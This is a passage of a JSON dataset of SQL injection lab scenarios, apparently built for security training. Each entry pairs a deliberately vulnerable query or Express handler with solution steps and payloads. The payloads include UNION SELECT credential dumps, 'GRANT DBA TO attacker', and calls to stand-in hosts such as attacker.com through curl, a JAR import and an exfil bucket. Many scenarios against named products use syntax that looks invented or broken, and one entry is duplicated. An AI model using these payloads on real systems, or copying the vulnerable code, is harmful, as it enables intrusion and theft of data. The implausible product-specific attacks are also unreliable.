      "AUTO_STOP = 1200) FROM system.metastore.warehouses--",
      "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
    "Lab Description": "A UDF registration system dynamically specifies function namespaces, allowing injection during function creation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate function creation",
      "Inject through namespace paths",
      "Bypass namespace validation",
      "Execute arbitrary functions",
      "Access system catalogs"
    ],
    "Vulnerability name": "Trino Namespace Injection",
    "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
    "payloads": [
      "system', 'return 1') FROM system.metadata.catalogs--",
      "pg_catalog', 'SELECT * FROM pg_user')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Table Function Arguments",
    "Lab Description": "A query system uses table functions with dynamic arguments, allowing injection during function execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate table function usage",
      "Inject through argument strings",
      "Bypass argument validation",
      "Modify result sets",
      "Access system tables"
    ],
    "Vulnerability name": "Presto Table Function Injection",
    "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
    "payloads": [
      "SELECT 1')) FROM system.runtime.nodes--",
      "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
    "Lab Description": "A data loading system configures dictionaries with dynamic source URLs, allowing injection during dictionary loading.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate dictionary creation",
      "Inject through URL parameters",
      "Bypass URL validation",
      "Access remote systems",
      "Modify dictionary content"
    ],
    "Vulnerability name": "ClickHouse Dictionary URL Injection",
    "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
    "payloads": [
      "http://attacker.com/payload')) FROM system.dictionaries--",
      "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SingleStore Columnstore Compression",
    "Lab Description": "A columnar storage system configures compression with dynamic parameters, allowing injection during table optimization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate compression settings",
      "Inject through compression clauses",
      "Bypass parameter validation",
      "Manipulate storage format",
      "Access encoded data"
    ],
    "Vulnerability name": "SingleStore Compression Injection",
    "srcCode": "ALTER TABLE table_name COLUMNSTORE ('\\'' + userOptions + '\\'')",
    "payloads": [
      "COMPRESSION='LZ4') FROM information_schema.tables--",
      "SORT KEY=(id))) FROM (SELECT * FROM sensitive_data)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in YugabyteDB CDC Stream Filters",
    "Lab Description": "A change data capture system creates streams with dynamic filters, allowing injection during change event generation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Locate stream creation",
      "Inject through filter expressions",
      "Bypass CDC validation",
      "Access unauthorized changes",
      "Exfiltrate via change events"
    ],
    "Vulnerability name": "Yugabyte CDC Filter Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE table_name WHERE '\\'' + userFilter + '\\''",
    "payloads": [
      "id > 0) FROM yb_cdc_state--",
      "1=1)) WITH ('format'='json')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CrateDB Fulltext Analyzer Definitions",
    "Lab Description": "A search system creates custom analyzers with dynamic configurations, allowing injection during text processing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate analyzer creation",
      "Inject through analyzer parameters",
      "Bypass analyzer validation",
      "Manipulate search results",
      "Access indexed content"
    ],
    "Vulnerability name": "CrateDB Analyzer Injection",
    "srcCode": "CREATE ANALYZER my_analyzer ('\\'' + userConfig + '\\'')",
    "payloads": [
      "tokenizer standard')) FROM information_schema.analyzers--",
      "filters lowercase')) FROM (SELECT * FROM sys.nodes)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TiDB Placement Policy Constraints",
    "Lab Description": "A distributed database configures placement policies with dynamic constraints, allowing injection during replica distribution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Locate policy creation",
      "Inject through constraint expressions",
      "Bypass region validation",
      "Manipulate replica placement",
      "Access cross-region data"
    ],
    "Vulnerability name": "TiDB Placement Injection",
    "srcCode": "CREATE PLACEMENT POLICY my_policy CONSTRAINTS = '\\'' + userConstraints + '\\''",
    "payloads": [
      "+region=us-west') FROM information_schema.placement_policies--",
      "+zone=1')) LEADER_CONSTRAINTS='+region=attacker'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL CREATE TEXT SEARCH TEMPLATE",
    "Lab Description": "A search system dynamically creates text search templates with unsafe lexize function parameters, allowing code execution during document processing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE TEXT SEARCH TEMPLATE usage",
      "Inject through lexize function parameter",
      "Bypass C function validation",
      "Execute arbitrary code in search operations",
      "Compromise full-text indexes"
    ],
    "Vulnerability name": "PostgreSQL Search Template Injection",
    "srcCode": "CREATE TEXT SEARCH TEMPLATE my_template (LEXIZE = '\\'' + userLexize + '\\'')",
    "payloads": [
      "dsimple_lexize') FROM pg_ts_template--",
      "shell_exec,'/bin/bash')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL Clone Plugin Data Filtering",
    "Lab Description": "A database cloning tool incorporates user input into CLONE DATA FILTER clauses without sanitization, allowing injection during clone operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CLONE INSTANCE commands",
      "Inject through DATA FILTER parameter",
      "Bypass clone validation checks",
      "Access source server data",
      "Tamper with cloned content"
    ],
    "Vulnerability name": "MySQL Clone Filter Injection",
    "srcCode": "CLONE LOCAL DATA DIRECTORY = '/backups' DATA FILTER = '\\'' + userFilter + '\\''",
    "payloads": [
      "EXCLUDE_SCHEMAS: ['mysql'] FROM clone_progress--",
      "INCLUDE_TABLES: ['%.secrets']))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger History Retention",
    "Lab Description": "A blockchain application dynamically configures ledger history retention periods without proper sanitization, allowing tampering with immutable records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ALTER LEDGER statements",
      "Inject through retention period parameter",
      "Bypass blockchain validation",
      "Purge historical records",
      "Disable cryptographic verification"
    ],
    "Vulnerability name": "SQL Ledger Retention Injection",
    "srcCode": "ALTER LEDGER ledger_name SET (LEDGER_RETENTION = '\\'' + userRetention + '\\'')",
    "payloads": [
      "INFINITE') FROM sys.ledger_blocks--",
      "0 DAYS'))) WITH (VERIFICATION = OFF)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle SDO_NET Memory Parameters",
    "Lab Description": "A spatial network application dynamically configures memory parameters for network analysis without proper sanitization, allowing arbitrary PL/SQL execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify SDO_NET.CREATE_NETWORK calls",
      "Inject through memory allocation parameters",
      "Bypass SGA validation checks",
      "Trigger buffer overflow conditions",
      "Execute privileged PL/SQL"
    ],
    "Vulnerability name": "Oracle Spatial Network Injection",
    "srcCode": "BEGIN SDO_NET.CREATE_NETWORK('\\'' + userParams + '\\''); END;",
    "payloads": [
      "network_name, 1000, 2000, 50, 2\") FROM user_sdo_networks--",
      "malicious_net')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Table Refresh Paths",
    "Lab Description": "A cloud pipeline refreshes external tables with dynamically constructed storage paths without proper sanitization, allowing access to unauthorized storage locations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER EXTERNAL TABLE REFRESH statements",
      "Inject through path parameters",
      "Bypass storage path validation",
      "Access sensitive cloud storage",
      "Poison metadata cache"
    ],
    "Vulnerability name": "Snowflake External Path Injection",
    "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
    "payloads": [
      "s3://legit/path') FROM information_schema.external_tables--",
      "azure://attacker/exfil')) LIST @~/staged"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
    "Lab Description": "A machine learning system dynamically constructs connection strings for remote models without proper sanitization, allowing Vertex AI endpoint manipulation.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE MODEL statements",
      "Inject through CONNECTION parameters",
      "Bypass IAM permission checks",
      "Redirect model predictions",
      "Execute arbitrary inference calls"
    ],
    "Vulnerability name": "BigQuery Model Connection Injection",
    "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
    "payloads": [
      "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES--",
      "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Magic Parameters",
    "Lab Description": "An interactive notebook incorporates user input into magic command parameters without sanitization, allowing cross-language code execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify magic command usage (%sql, %python)",
      "Inject through parameter placeholders",
      "Bypass notebook sanitization",
      "Execute arbitrary code across languages",
      "Access linked cloud services"
    ],
    "Vulnerability name": "Synapse Magic Command Injection",
    "srcCode": "%sql SELECT * FROM table WHERE id = '\\'' + userParam + '\\''",
    "payloads": [
      "1' UNION SELECT * FROM sensitive_table--",
      "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift ML Model Hyperparameters",
    "Lab Description": "A predictive analytics system dynamically constructs model hyperparameters without proper sanitization, allowing training data access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE MODEL statements",
      "Inject through HPARAMETERS clause",
      "Bypass SageMaker validation",
      "Access training datasets",
      "Manipulate model behavior"
    ],
    "Vulnerability name": "Redshift ML Hyperparameter Injection",
    "srcCode": "CREATE MODEL model_name HPARAMETERS ('\\'' + userParams + '\\'') AS SELECT...",
    "payloads": [
      "max_depth=5') FROM svv_ml_models--",
      "objective='binary:logistic'))) FROM (SELECT * FROM pg_user)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner Change Stream Value Capture",
    "Lab Description": "A CDC system dynamically configures change stream value capture types without proper sanitization, allowing data exfiltration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CREATE CHANGE STREAM statements",
      "Inject through VALUE_CAPTURE_TYPE parameter",
      "Bypass stream validation checks",
      "Access unauthorized change data",
      "Tamper with captured values"
    ],
    "Vulnerability name": "Spanner Value Capture Injection",
    "srcCode": "CREATE CHANGE STREAM stream FOR TABLE table_name VALUE_CAPTURE_TYPE '\\'' + userCapture + '\\''",
    "payloads": [
      "OLD_AND_NEW_VALUES) FROM information_schema.change_streams--",
      "NEW_VALUES'))) FOR ALL"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Unity Catalog Sharing Recipients",
    "Lab Description": "A data sharing platform dynamically adds recipients to Delta Shares without proper sanitization, allowing ACL bypass.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify ALTER SHARE statements",
      "Inject through recipient email parameters",
      "Bypass email validation checks",
      "Access unauthorized shares",
      "Exfiltrate via sharing notifications"
    ],
    "Vulnerability name": "Unity Catalog Sharing Injection",
    "srcCode": "ALTER SHARE my_share ADD TO '\\'' + userEmail + '\\''",
    "payloads": [
      "attacker@domain.com') FROM system.information_schema.shares--",
      "legit@company.com'; SELECT * FROM hive_metastore.sensitive.tbl--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowpark Java UDF Class Paths",
    "Lab Description": "A Snowpark application dynamically specifies Java UDF classpaths without proper sanitization, allowing arbitrary code execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify CREATE FUNCTION statements",
      "Inject through IMPORTS clause",
      "Bypass JAR validation checks",
      "Load malicious Java classes",
      "Execute arbitrary code"
    ],
    "Vulnerability name": "Snowpark Java UDF Injection",
    "srcCode": "CREATE FUNCTION my_func() RETURNS STRING LANGUAGE JAVA IMPORTS = ('\\'' + userJar + '\\'')",
    "payloads": [
      "attacker.com/malicious.jar FROM information_schema.functions--",
      "s3://exfil/exploit.jar'))) HANDLER='MaliciousClass'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Continuations",
    "Lab Description": "A NoSQL application dynamically constructs continuation tokens in stored procedures without proper sanitization, allowing pagination control.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify stored procedure execution",
      "Inject through continuationToken parameter",
      "Bypass query limits",
      "Access unauthorized partitions",
      "Exfiltrate via pagination"
    ],
    "Vulnerability name": "CosmosDB Continuation Injection",
    "srcCode": "function queryDocs(continuationToken) { var response = __.queryDocuments(\\'' + userQuery + '\\'', { continuation: '\\'' + userToken + '\\'' }); }",
    "payloads": [
      "attacker-token') FROM c WHERE c._ts > 0--",
      "malicious' })); function() { return __.queryDocuments(__.getSelfLink()) }--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Properties",
    "Lab Description": "An analytics tool dynamically constructs ODBC connection properties without proper sanitization, allowing index access.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify ODBC connection strings",
      "Inject through Properties parameter",
      "Bypass driver validation checks",
      "Access restricted indices",
      "Exfiltrate via driver errors"
    ],
    "Vulnerability name": "Elasticsearch ODBC Property Injection",
    "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
    "payloads": [
      "attacker.com;UID=admin;PWD=' OR 1=1 --",
      "legit.com:9200\";SSL=1;SSLCertAuth=0;"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
    "Lab Description": "A dashboard tool dynamically forces identifier casing without proper sanitization, allowing query manipulation.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case manipulation",
      "Inject through case expressions",
      "Bypass parser validation checks",
      "Access system tables",
      "Execute native queries"
    ],
    "Vulnerability name": "Druid Case Forcing Injection",
    "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
    "payloads": [
      "datasource FROM (SELECT * FROM sys.segments) --",
      "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Headers",
    "Lab Description": "A monitoring system dynamically constructs HTTP request headers in Flux without proper sanitization, allowing internal endpoint access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify http.get/post calls",
      "Inject through header parameters",
      "Bypass header validation checks",
      "Access internal endpoints",
      "Exfiltrate via HTTP responses"
    ],
    "Vulnerability name": "Flux HTTP Header Injection",
    "srcCode": "import \"http\" http.get(url: 'url', headers: '\\'' + userHeaders + '\\'')",
    "payloads": [
      "{'X-Auth': 'attacker'} FROM _internal.monitor--",
      "{'Authorization': 'Bearer ${string(v: r._value)}'}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
    "Lab Description": "A time-series database dynamically configures compression segment columns without proper sanitization, allowing data access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER TABLE SET compression",
      "Inject through segmentby parameters",
      "Bypass column validation checks",
      "Access compressed chunks",
      "Manipulate compression ratios"
    ],
    "Vulnerability name": "Timescale Compression Injection",
    "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
    "payloads": [
      "device_id FROM _timescaledb_catalog.hypertable--",
      "time DESC')) WITH (compress_orderby = 'time DESC')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
    "Lab Description": "A change data capture system dynamically constructs webhook headers without proper sanitization, allowing request manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE CHANGEFEED WITH webhook",
      "Inject through header parameters",
      "Bypass header validation checks",
      "Access webhook endpoints",
      "Exfiltrate via custom headers"
    ],
    "Vulnerability name": "Cockroach Webhook Header Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'X-Auth: attacker'",
      "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
    "Lab Description": "A data pipeline dynamically configures HTTP request headers in DuckDB without proper sanitization, allowing credential theft.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTPFS usage",
      "Inject through header parameters",
      "Bypass header validation checks",
      "Access restricted URLs",
      "Exfiltrate via server responses"
    ],
    "Vulnerability name": "DuckDB HTTPFS Header Injection",
    "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
    "payloads": [
      "'Authorization: Basic YWRtaW46cGFzcw=='",
      "'X-Forwarded-For: 127.0.0.1'"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
    "Lab Description": "A data warehouse dynamically controls materialized view loading without proper sanitization, allowing data access.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify REFRESH MATERIALIZED VIEW",
      "Inject through WITH DATA parameter",
      "Bypass refresh validation checks",
      "Trigger full data reload",
      "Access underlying tables"
    ],
    "Vulnerability name": "Materialized View Refresh Injection",
    "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOption + '\\'')",
    "payloads": [
      "DATA) FROM pg_matviews--",
      "NO DATA')) CONCURRENTLY"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Ledger History Retention",
    "Lab Description": "A blockchain application dynamically configures ledger retention without proper sanitization, allowing history tampering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ALTER LEDGER statements",
      "Inject through retention parameters",
      "Bypass blockchain validation checks",
      "Tamper with historical records",
      "Disable immutable logging"
    ],
    "Vulnerability name": "SQL Ledger Retention Injection",
    "srcCode": "ALTER LEDGER ledger SET (LEDGER_VIEW_RETENTION = '\\'' + userRetention + '\\'')",
    "payloads": [
      "INFINITE') FROM sys.ledger_blocks--",
      "0 DAYS'))) WITH (VERIFICATION = OFF)"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking application dynamically sorts transaction history based on user input without sanitizing the 'sort' parameter. This enables SQL injection via ORDER BY manipulation. The application echoes detailed SQL errors when invalid sorting fields are requested. To solve: Extract full table information by abusing ORDER BY injection vulnerabilities.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept traffic using Burp Suite during sorting transactions",
      "Fuzz 'sort' parameter with large numeric values (ORDER BY 10, 20, etc.)",
      "Inject 'ORDER BY 1--' to confirm column count via response analysis",
      "Use UNION SELECT to enumerate database structure",
      "Extract table and column names for user credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sortBy = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sortBy}`;\n  db.query(query, (err, results) => {\n    if (err) return res.send('Error: ' + err.sqlMessage);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1--",
      "2--",
      "1 UNION SELECT NULL, username, password FROM users--",
      "1 UNION SELECT username, password, NULL FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS uses unfiltered user-provided category IDs to group blog posts. Improperly handled GROUP BY inputs allow SQL injection. The verbose logging system exposes internal query structure during errors. To solve: Leak administrative tokens from a hidden 'admin_tokens' table via GROUP BY injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture group filter requests via OWASP ZAP",
      "Inject invalid syntax into 'category_id' parameter",
      "Use Boolean-based payloads to manipulate GROUP BY",
      "Construct UNION SELECT chain to access admin tokens",
      "Verify token leakage through altered CMS admin panel behavior"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts', (req, res) => {\n  const categoryId = req.query.category;\n  const sql = `SELECT title, content FROM posts GROUP BY ${categoryId}`;\n  db.query(sql, (err, data) => {\n    if (err) res.send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "1--",
      "1 UNION SELECT token,NULL,NULL FROM admin_tokens--",
      "1) UNION SELECT email,password,NULL FROM users--",
      "' UNION SELECT 1,2,3 FROM admin_tokens--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard aggregates device statistics and filters them through a vulnerable HAVING clause. Lack of input sanitization in device metrics allows an attacker to inject SQL through manipulated thresholds. To solve: Dump sensitive firmware update URLs stored within a hidden settings table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap to automate HAVING clause fuzzing on the metrics API",
      "Manually inject time-delay payloads to validate blind injection",
      "Chain multiple Boolean conditions to infer table structures",
      "Leverage UNION payloads to exfiltrate firmware URLs",
      "Capture firmware URLs through server error logs or API responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device-stats', (req, res) => {\n  const threshold = req.body.threshold;\n  const query = `SELECT device_id, AVG(temp) FROM stats HAVING AVG(temp) > ${threshold}`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "1 HAVING 1=1 UNION SELECT NULL, firmware_url FROM settings--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 HAVING AVG(temp) = AVG(temp) UNION SELECT NULL, update_link FROM firmware--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS admin panel aggregates page views, filtering them through a vulnerable HAVING clause without sanitization. This allows attackers to inject SQL commands to control aggregation behavior. To solve: Exploit the HAVING clause to leak internal admin credentials via a UNION-based payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept traffic to the admin panel with Burp Suite",
      "Inject threshold parameters with SQL expressions to validate vulnerability",
      "Craft UNION SELECT payloads targeting admin credentials",
      "Use time-based blind payloads to infer database structures",
      "Retrieve admin user credentials from the CMS backend"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/analytics', (req, res) => {\n  const views = req.query.views;\n  const query = `SELECT page, COUNT(*) FROM analytics HAVING COUNT(*) > ${views}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(400).send('Query Error: ' + err.sqlMessage);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "10 UNION SELECT username,password FROM admins--",
      "5 HAVING 1=1--",
      "5 UNION SELECT session_id,email FROM admin_sessions--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "An API Gateway sorts user-supplied data directly in SQL ORDER BY clauses. No parameterization exists, exposing raw queries to injection risks. When invalid columns are referenced, verbose API error messages are returned. To solve: Manipulate ORDER BY to expose hidden 'admin_logs' data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send crafted sort parameters via Postman",
      "Observe server error behavior with invalid ORDER BY inputs",
      "Craft UNION payload injecting admin_logs table",
      "Iteratively retrieve admin activity history via payload chaining",
      "Analyze admin log records to reveal sensitive actions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/users', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM users ORDER BY ${sort}`;\n  db.query(sql, (error, results) => {\n    if (error) res.status(500).send('Error: ' + error.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "1--",
      "id--",
      "id UNION SELECT id, activity FROM admin_logs--",
      "1 UNION SELECT username,password FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking application groups user transaction types based on input from a 'group' parameter. Lack of validation enables SQL injection within GROUP BY. The system displays database error messages when grouping fails. To solve: Extract and enumerate privileged account types using GROUP BY injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture transaction grouping requests with OWASP ZAP",
      "Inject invalid characters to detect SQL parsing errors",
      "Use Boolean payloads to validate GROUP BY vulnerability",
      "Craft UNION SELECT payloads to extract account type info",
      "Enumerate privileged accounts and administrative privileges"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/group', (req, res) => {\n  const group = req.query.group;\n  const sql = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "account_type--",
      "1 UNION SELECT role, NULL FROM user_roles--",
      "group_id UNION SELECT email,password FROM admins--",
      "account_id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard orders sensor data based on user-supplied field names without sanitization. This allows ORDER BY SQL injection through crafted requests. To solve: Extract sensitive device keys stored in a hidden 'iot_keys' table via injected ORDER BY clauses.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept device list sorting",
      "Fuzz 'sortField' parameter to find vulnerable injection points",
      "Send crafted UNION payloads inserting iot_keys table access",
      "Analyze extracted keys from verbose error messages",
      "Confirm exfiltrated device keys by accessing private endpoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM devices ORDER BY ${sortField}`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('SQL Injection Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "device_id--",
      "1 UNION SELECT device_id, device_key FROM iot_keys--",
      "temperature UNION SELECT username,password FROM users--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS aggregates comment statistics and filters them through a vulnerable HAVING clause. Improperly validated comment count filters expose SQL injection risks. To solve: Dump the CMS user session table by exploiting the HAVING clause via Boolean-based and time-based techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap targeting comment statistics APIs",
      "Inject logical conditions to validate HAVING injection",
      "Perform time-based blind injections to map database schema",
      "Craft UNION SELECT queries leaking user session IDs",
      "Use harvested sessions to hijack CMS admin accounts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/comments/stats', (req, res) => {\n  const filter = req.query.filter;\n  const sql = `SELECT post_id, COUNT(*) FROM comments GROUP BY post_id HAVING COUNT(*) > ${filter}`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(500).send('DB Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "10 UNION SELECT session_id, username FROM user_sessions--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 HAVING COUNT(*)=COUNT(*) UNION SELECT token, NULL FROM sessions--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in GROUP BY Clause",
    "Lab Description": "An API Gateway aggregates logs grouped by user agent strings. User-supplied input is passed directly into the GROUP BY clause without sanitization. Verbose error messages reveal SQL parsing issues. To solve: Inject payloads to retrieve internal log files stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture aggregation requests via Postman",
      "Inject invalid syntax into 'group' parameter",
      "Confirm GROUP BY injection via Boolean-based payloads",
      "Craft UNION SELECT injections targeting log file metadata",
      "Dump internal error logs through crafted responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/logs', (req, res) => {\n  const groupBy = req.body.group;\n  const query = `SELECT COUNT(*), ${groupBy} FROM logs GROUP BY ${groupBy}`;\n  db.query(query, (err, data) => {\n    if (err) res.send('SQL Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "user_agent--",
      "1 UNION SELECT file_path, file_size FROM internal_logs--",
      "os_version UNION SELECT username,password FROM users--",
      "device_type OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT platform aggregates average sensor readings using a vulnerable HAVING filter controlled by the user. Improper sanitization enables advanced HAVING clause injections. To solve: Leak internal device firmware versions by crafting UNION payloads exploiting aggregation logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept aggregated device reading API",
      "Fuzz threshold parameters to confirm injection points",
      "Inject Boolean conditions and measure server response time",
      "Craft UNION SELECTs leaking firmware version info",
      "Collect firmware details and attempt device firmware downgrade attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/devices/aggregate', (req, res) => {\n  const threshold = req.body.threshold;\n  const sql = `SELECT AVG(temp), device_id FROM readings GROUP BY device_id HAVING AVG(temp) > ${threshold}`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1 HAVING 1=1--",
      "5 UNION SELECT firmware_version, NULL FROM firmware_data--",
      "1 OR 1=1 AND SLEEP(5)--",
      "2 UNION SELECT update_link,NULL FROM firmware_updates--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal sorts user transactions based on dynamic parameters with no input validation. This enables ORDER BY clause SQL injection, causing errors or data leakage. To solve: Exploit the ORDER BY injection to enumerate database schema and exfiltrate high-value account information.",
    "Difficulty Level": "Medium",
